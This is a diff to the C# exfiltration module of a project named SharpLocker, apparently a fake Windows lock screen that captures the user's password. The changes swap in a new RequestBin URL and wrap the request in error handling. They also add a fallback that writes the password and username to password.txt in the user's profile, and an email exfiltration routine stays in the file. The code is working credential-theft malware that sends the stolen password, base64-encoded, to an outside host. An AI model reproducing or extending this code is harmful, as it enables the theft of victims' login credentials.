@@ -1,4 +1,5 @@
 ﻿using System;
+using System.IO;
 using System.Net;
 using System.Net.Mail;
 using System.Text;
@@ -10,13 +11,16 @@ namespace SharpLocker
         public static void Extract(string password)
         {
             //Extract with request bin
-            ExtractWithRequastBin(password);
+            ExtractWithRequestBin(password);
 
             //Extract with email
             //ExtractWithEmail(password);
+
+            //Extract to text file
+            //ExtractToFile(password);
         }
 
-        static void ExtractWithRequastBin(string password)
+        private static void ExtractWithRequestBin(string password)
         {
             //http://requestbin.net
             //RequestBin is a service that allows you to inspect requests.
@@ -25,7 +29,7 @@ namespace SharpLocker
 
             //YOUR RequestBin link
             //format: http://requestbin.net/r/xxxxxxxx
-            string url = "http://requestbin.net/r/rv6v9wrv";
+            string url = "http://requestbin.net/r/1d8vuu91";
 
             bool EncodeWithBase64 = true;
             bool IncludeUsername = true;
@@ -49,12 +53,20 @@ namespace SharpLocker
                 p = Convert.ToBase64String(plainTextBytes);
             }
 
-            HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
-            req.GetResponse();
+            try
+            {
+                HttpWebRequest req = (HttpWebRequest)WebRequest.Create(url + "?" + p);
+                req.GetResponse();
+            }
 
+            catch (Exception e)
+            { 
+                Console.WriteLine("Exception: " + e.Message);
+                ExtractToFile(p);
+            }
         }
 
-        static void ExtractWithEmail(string password)
+        private static void ExtractWithEmail(string password)
         {
             //This sends an email with the password and computer details.
 
@@ -66,7 +78,7 @@ namespace SharpLocker
             //Don't touch this!
             string body = "Password: " + password + " Username&Domain: " + System.Security.Principal.WindowsIdentity.GetCurrent().Name;
 
-            MailMessage msg = new MailMessage(e_address, e_address, "Windwos Password on " + System.Security.Principal.WindowsIdentity.GetCurrent().Name, body);
+            MailMessage msg = new MailMessage(e_address, e_address, "Windows Password on " + System.Security.Principal.WindowsIdentity.GetCurrent().Name, body);
             msg.IsBodyHtml = true;
             SmtpClient sc = new SmtpClient(e_host_addr, e_host_port);
             sc.UseDefaultCredentials = false;
@@ -74,6 +86,29 @@ namespace SharpLocker
             sc.Credentials = cre;
             sc.EnableSsl = true;
             sc.Send(msg);
+        }
+
+        /// <summary>
+        /// Extract the logged information to a text file
+        /// <remark>The file is stored in the current user directory</remark>
+        /// </summary>
+        /// <param name="password"></param>
+        private static void ExtractToFile(string password)
+        {
+            string path = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
+            string user = System.Security.Principal.WindowsIdentity.GetCurrent().Name;
+            string text = "Password: " + password + " Username&Domain: " + user;
+
+            try
+            {
+                StreamWriter streamWriter = new StreamWriter($"{path}\\password.txt");
+                streamWriter.WriteLine(text);
+                streamWriter.Close();
+            }
+            catch(IOException e)
+            {
+                Console.WriteLine("Exception: " + e.Message);
+            }
         }
     }
 }
